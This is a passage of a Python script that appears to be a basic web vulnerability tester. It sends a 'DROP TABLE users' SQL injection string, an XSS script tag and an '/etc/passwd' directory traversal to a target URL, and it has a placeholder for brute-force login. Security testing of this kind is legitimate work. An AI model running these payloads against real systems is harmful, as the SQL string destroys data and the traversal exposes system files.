    {"name": "SQL Injection", "payload": "'; DROP TABLE users; --"},
    {"name": "Cross-Site Scripting (XSS)", "payload": "<script>alert('XSS')</script>"},
    {"name": "Brute-Force Login", "payload": None},  # Payload handled separately
    {"name": "Directory Traversal", "payload": "../../../etc/passwd"}
]

# Function to test for SQL Injection
def test_sql_injection(url, username, password):
    test_url = f"{url}?username={username}&password={password}"
    payload = VULNERABILITIES[0]["payload"]
    test_url = f"{url}?username={username}{payload}&password={password}"
    try:
        response = requests.get(test_url)
        if "error" in response.text.lower() or "invalid" in response.text.lower():
            print(f"[SQLi] Possible SQL Injection vulnerability detected.")
            return True
        else:
            print(f"[SQLi] No SQL Injection vulnerability found.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[SQLi] Error during request: {e}")
        return False

# Function to test for XSS
def test_xss(url, username, password):
    test_url = f"{url}?username={username}&password={password}"
    payload = VULNERABILITIES[1]["payload"]
    test_url = f"{url}?username={username}&password={password}&comment={payload}"
    try:
        response = requests.get(test_url)
        if payload in response.text:
            print(f"[XSS] Possible XSS vulnerability detected.")
            return True
        else:
            print(f"[XSS] No XSS vulnerability found.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[XSS] Error during request: {e}")
        return False

# Function to test for Brute-Force Login
def test_brute_force(url, username, password):
    # This is a placeholder.  A real brute-force attack would try many passwords.
    print("[Brute-Force] Attempting brute-force login (limited example).")
    try:
        response = requests.post(url, data={"username": username, "password": password})
        if "login successful" in response.text.lower():
            print(f"[Brute-Force] Login successful with password: {password}")
            return True
        else:
            print(f"[Brute-Force] Login failed.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[Brute-Force] Error during request: {e}")
        return False

# Function to test for Directory Traversal
def test_directory_traversal(url, username, password):
    test_url = f"{url}?file={VULNERABILITIES[3]['payload']}"
    try:
        response = requests.get(test_url)
        if "root" in response.text:  # Check for sensitive content
